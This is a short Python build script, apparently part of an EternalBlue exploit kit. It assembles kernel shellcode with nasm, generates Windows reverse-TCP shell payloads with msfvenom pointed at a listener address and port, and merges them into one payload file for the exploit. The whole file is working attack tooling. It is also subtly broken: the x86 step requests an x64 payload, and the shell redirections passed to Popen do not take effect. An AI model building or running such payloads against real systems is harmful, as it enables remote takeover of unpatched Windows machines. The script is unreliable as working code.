import subprocess as sp
import pyfiglet as pf

sp.run(['clear'])
print(pf.figlet_format("eternalB", font="larry3d"))


#print("Compiling x64 kernel shellcode...")
sp.run(['nasm', '-f', 'bin', 'shellcode/eternalblue_kshellcode_x64.asm', '-o', 'shellcode/sc_x64_kernel.bin'])
#print("Compiling x86 kernel shellcode...")
sp.run(['nasm', '-f', 'bin', 'shellcode/eternalblue_kshellcode_x86.asm', '-o', 'shellcode/sc_x86_kernel.bin'])

targetIp="LHOST=192.168.69.99" #$1
portx64="LPORT=1234" #$2
portx86="LPORT=1234" #$3

#print("Generating x64 cmd shell...")
sp.run(['msfvenom', '-p', 'windows/x64/shell_reverse_tcp', '-f', 'raw', '-o', 'shellcode/sc_x64_msf.bin', 'EXITFUNC=thread', targetIp, portx64])
#print("Generating x86 cmd shell...")
sp.run(['msfvenom', '-p', 'windows/x64/shell_reverse_tcp', '-f', 'raw', '-o', 'shellcode/sc_x86_msf.bin', 'EXITFUNC=thread', targetIp, portx86])

#print("Merging shellcode...")
sp.Popen(['cat', 'shellcode/sc_x64_kernel.bin', 'shellcode/sc_x64_msf.bin', '>', 'shellcode/sc_x64.bin'])
#sp.run(['cat', 'sc_x64_kernel.bin', 'sc_x64_msf.bin'])
sp.Popen(['cat', 'shellcode/sc_x86_kernel.bin', 'shellcode/sc_x86_msf.bin', '>', 'shellcode/sc_x86.bin'])
#sp.run(['cat', 'sc_x86_kernel.bin', 'sc_x86_msf.bin'])
sp.run(['python3', 'shellcode/eternalblue_sc_merge.py', 'shellcode/sc_x86.bin', 'shellcode/sc_x64.bin', 'shellcode/sc_all.bin'])

print("\nDONE")
